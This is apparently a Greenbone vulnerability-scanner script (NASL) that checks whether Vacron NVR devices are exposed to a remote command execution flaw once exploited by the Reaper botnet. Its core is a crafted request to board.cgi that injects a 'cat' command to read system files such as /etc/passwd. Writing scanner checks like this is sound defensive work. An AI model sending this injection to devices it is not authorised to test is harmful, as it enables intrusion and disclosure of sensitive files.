# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:vacron:nvr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107187");
  script_version("2025-07-03T05:42:54+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-07-03 05:42:54 +0000 (Thu, 03 Jul 2025)");
  script_tag(name:"creation_date", value:"2017-10-11 10:31:53 +0200 (Wed, 11 Oct 2017)");
  script_cve_id("CVE-2025-34043");
  script_name("Vacron NVR RCE Vulnerability (Oct 2017) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_vacron_nvr_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("vacron/nvr/http/detected");
  script_require_ports("Services/www", 8080);

  script_xref(name:"URL", value:"https://ssd-disclosure.com/ssd-advisory-vacron-nvr-remote-command-execution/");
  script_xref(name:"URL", value:"https://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");
  script_xref(name:"URL", value:"https://www.sonicwall.com/blog/vacron-network-video-recorder-remote-command-execution");

  script_tag(name:"summary", value:"Vacron NVR is prone to a remote code execution (RCE)
  vulnerability.

  This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability is located in the board.cgi due to non
  sufficient sanitization of the input passed through the Get request.");

  script_tag(name:"impact", value:"Remote attackers are able to execute remote command and view
  sensitive information such as /etc/passwd.");

  script_tag(name:"affected", value:"All versions of Vacron NVR.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if(!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = "/" + files[pattern];

  url = dir + "/board.cgi?cmd=cat%20" + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
